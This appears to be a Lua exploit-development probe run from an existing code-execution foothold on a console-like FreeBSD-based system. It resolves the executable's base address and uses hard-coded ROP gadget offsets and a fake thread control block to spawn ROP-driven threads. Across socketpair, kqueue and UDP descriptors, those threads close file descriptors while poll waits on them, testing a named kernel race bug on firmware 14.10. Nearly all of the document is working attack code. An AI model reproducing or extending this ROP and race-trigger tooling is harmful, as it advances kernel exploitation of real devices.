-- CRASH_CLASS: MODERATE
-- PROBE 511a: poll/close race — crash-or-survive, 100 iterations
--
-- 509a survived 15 races but stdout corrupted (threading + memory ops
-- leak binary data into TCP stream). This probe takes a different approach:
--
-- Strategy: run 100 race iterations with ZERO output during races.
-- The ONLY question: does the process crash or survive?
-- - CRASH → CVE-2026-45251 is live on 14.10, race window exists
-- - COMPLETE → the kernel handles concurrent poll+close safely
--
-- After all races, print a single summary line. If stdout is corrupted
-- by then, send_probe still reports COMPLETE vs crash status.
--
-- Tests socketpair (AF_UNIX SOCK_DGRAM) — simplest concurrent fd.

-- Print header BEFORE any thread operations
io.write("=== PROBE 511a: poll/close crash test (100 iter) ===\n")
io.flush()

------------------------------------------------------------------ helpers
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

------------------------------------------------------------------ syscalls
local sc6    = make_syscall(6)    -- close
local sc20   = make_syscall(20)   -- getpid
local sc73   = make_syscall(73)   -- munmap
local sc97   = make_syscall(97)   -- socket
local sc135  = make_syscall(135)  -- socketpair
local sc209  = make_syscall(209)  -- poll
local sc240  = make_syscall(240)  -- nanosleep
local sc362  = make_syscall(362)  -- kqueue
local sc455  = make_syscall(455)  -- thr_new
local sc477  = make_syscall(477)  -- mmap
local sc593  = make_syscall(593)  -- dynlib_get_info

local pid = to_num(sc20())
io.write("pid: " .. pid .. "\n")

-- eboot base
local info = memory.alloc(0x200)
safe_wd(info, 0x160)
pcall(function() sc593(uint64(0), info) end)
local eb_lo = safe_rd(info + 0x108)
local eb_hi = safe_rd(info + 0x10C)
local eboot = uint64(string.format("0x%X%08X", eb_hi or 0, eb_lo or 0))

local pipe_str = tostring(syscall.pipe)
local fn_str = pipe_str:match("fcall_stub%.fn_addr: (0x[0-9a-fA-F]+)")
if not fn_str then io.write("FATAL: no fn_addr\n"); io.flush(); return end
local fn_addr = uint64(fn_str)

io.write("eboot: " .. string.format("0x%X%08X", eb_hi or 0, eb_lo or 0) .. "\n")
io.write("fn_addr: " .. fn_str .. "\n")

-- gadgets
local pop_rax_ret = eboot + uint64(0x992)
local pop_rdi_ret = eboot + uint64(0xC9DFE)
local pop_rsi_ret = eboot + uint64(0xD77D)

-- fake TCB (one-time setup)
local fake_tcb = memory.alloc(0x1000)
for i = 0, 0xFF8, 8 do safe_wq(fake_tcb + i, fake_tcb) end
local tcb_ptr = memory.alloc(8)
safe_wq(tcb_ptr, fake_tcb)

local STACK_SIZE = 0x200000

-- sleep helper
local ts_buf = memory.alloc(16)
local function msleep(ms)
    safe_wq(ts_buf, uint64(0))
    safe_wq(ts_buf + 8, uint64(ms * 1000000))
    pcall(function() sc240(uint64(to_num(ts_buf)), uint64(0)) end)
end

-- pre-allocate reusable buffers
local sv_buf  = memory.alloc(8)
local pollfd  = memory.alloc(8)
local param   = memory.alloc(0x40)
local tid_buf = memory.alloc(8)

io.write("setup done\n")
io.flush()

-- ============================================================
-- spawn_closer: child closes target_fd immediately via ROP
-- Reuses pre-allocated param/tid_buf to avoid extra allocs
-- ============================================================
local function spawn_closer(target_fd)
    local child_stack = sc477(uint64(0), uint64(STACK_SIZE), uint64(0x3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    if to_num(child_stack) == 0 then return nil end

    local top = child_stack + uint64(STACK_SIZE)
    local top_lo = to_num(top)
    local rsp = top - uint64(top_lo % 16) - uint64(8)

    local off = 0
    local function wq(val) safe_wq(rsp + off, val); off = off + 8 end

    -- sysarch(SET_FSBASE=129, tcb_ptr)
    wq(tcb_ptr)         -- rsi = tcb_ptr (from pop_rsi_ret entry)
    wq(pop_rax_ret)
    wq(uint64(165))     -- rax = 165 (sysarch)
    wq(fn_addr)          -- syscall; ret

    -- close(target_fd) — IMMEDIATE
    wq(pop_rdi_ret)
    wq(uint64(target_fd))
    wq(pop_rax_ret)
    wq(uint64(6))        -- rax = 6 (close)
    wq(fn_addr)

    -- thr_exit(0)
    wq(pop_rdi_ret)
    wq(uint64(0))
    wq(pop_rax_ret)
    wq(uint64(431))      -- rax = 431 (thr_exit)
    wq(fn_addr)

    -- fill thr_param
    for j = 0, 0x38, 4 do safe_wd(param + j, 0) end
    safe_wq(param + 0x00, pop_rsi_ret)        -- start_func
    safe_wq(param + 0x08, uint64(129))         -- arg = SET_FSBASE cmd
    safe_wq(param + 0x10, child_stack)
    safe_wq(param + 0x18, uint64(STACK_SIZE))
    safe_wq(tid_buf, uint64(0))
    safe_wq(param + 0x30, tid_buf)

    pcall(function() sc455(uint64(to_num(param)), uint64(0x38)) end)
    return child_stack
end

-- ============================================================
-- PHASE 1: socketpair poll/close race — 50 iterations
-- ============================================================
local sp_survived = 0
local sp_polls = {}  -- store poll return values as Lua numbers

for i = 1, 50 do
    -- create socketpair
    safe_wd(sv_buf, 0xFFFFFFFF)
    safe_wd(sv_buf + 4, 0xFFFFFFFF)
    local sp_ok = pcall(function()
        sc135(uint64(1), uint64(2), uint64(0), uint64(to_num(sv_buf)))
    end)
    local fd0 = safe_rd(sv_buf)
    local fd1 = safe_rd(sv_buf + 4)

    if not sp_ok or not fd0 or fd0 > 0xFFF0 then break end

    -- set up pollfd
    safe_wd(pollfd, fd0)
    safe_wd(pollfd + 4, 0x0001)  -- POLLIN

    -- spawn child to close fd0 immediately
    local stk = spawn_closer(fd0)

    -- RACE: poll blocks while child closes fd0
    local poll_ok, poll_ret = pcall(function()
        return sc209(uint64(to_num(pollfd)), uint64(1), uint64(5000))
    end)

    local rv = -999
    if poll_ok then rv = to_num(poll_ret) end
    table.insert(sp_polls, rv)

    -- wait for child to finish
    msleep(10)
    sp_survived = sp_survived + 1

    -- cleanup
    pcall(function() sc6(uint64(fd1)) end)
    if stk then pcall(function() sc73(stk, uint64(STACK_SIZE)) end) end
end

-- ============================================================
-- PHASE 2: kqueue poll/close race — 30 iterations
-- ============================================================
local kq_survived = 0
local kq_polls = {}

for i = 1, 30 do
    local ok_kq, kq_ret = pcall(function() return sc362() end)
    local kfd = 0
    if ok_kq then kfd = to_num(kq_ret) end
    if kfd < 1 then break end

    safe_wd(pollfd, kfd)
    safe_wd(pollfd + 4, 0x0001)

    local stk = spawn_closer(kfd)

    local poll_ok, poll_ret = pcall(function()
        return sc209(uint64(to_num(pollfd)), uint64(1), uint64(5000))
    end)

    local rv = -999
    if poll_ok then rv = to_num(poll_ret) end
    table.insert(kq_polls, rv)

    msleep(10)
    kq_survived = kq_survived + 1

    if stk then pcall(function() sc73(stk, uint64(STACK_SIZE)) end) end
end

-- ============================================================
-- PHASE 3: UDP socket poll/close race — 20 iterations
-- ============================================================
local udp_survived = 0
local udp_polls = {}

for i = 1, 20 do
    local ok_u, u_ret = pcall(function()
        return sc97(uint64(2), uint64(2), uint64(0))
    end)
    local ufd = 0
    if ok_u then ufd = to_num(u_ret) end
    if ufd < 1 then break end

    safe_wd(pollfd, ufd)
    safe_wd(pollfd + 4, 0x0001)

    local stk = spawn_closer(ufd)

    local poll_ok, poll_ret = pcall(function()
        return sc209(uint64(to_num(pollfd)), uint64(1), uint64(5000))
    end)

    local rv = -999
    if poll_ok then rv = to_num(poll_ret) end
    table.insert(udp_polls, rv)

    msleep(10)
    udp_survived = udp_survived + 1

    if stk then pcall(function() sc73(stk, uint64(STACK_SIZE)) end) end
end

-- ============================================================
-- RESULTS — printed after ALL races complete
-- ============================================================
-- If we reach here, the process survived all 100 race iterations

io.write("\n")
io.write("=== RESULTS ===\n")
io.write("socketpair: " .. sp_survived .. "/50\n")
io.write("kqueue: " .. kq_survived .. "/30\n")
io.write("UDP: " .. udp_survived .. "/20\n")
io.write("TOTAL: " .. (sp_survived + kq_survived + udp_survived) .. "/100\n")

-- poll return value summary
local function summarize(polls)
    local counts = {}
    for _, v in ipairs(polls) do
        local k = tostring(v)
        counts[k] = (counts[k] or 0) + 1
    end
    local parts = {}
    for k, v in pairs(counts) do
        table.insert(parts, k .. "x" .. v)
    end
    return table.concat(parts, " ")
end

io.write("sp_polls: " .. summarize(sp_polls) .. "\n")
io.write("kq_polls: " .. summarize(kq_polls) .. "\n")
io.write("udp_polls: " .. summarize(udp_polls) .. "\n")

local pid2 = to_num(sc20())
io.write("pid: " .. pid2 .. (pid2 == pid and " [OK]" or " [CHANGED!]") .. "\n")
io.write("\n=== PROBE 511a COMPLETE ===\n")
io.flush()
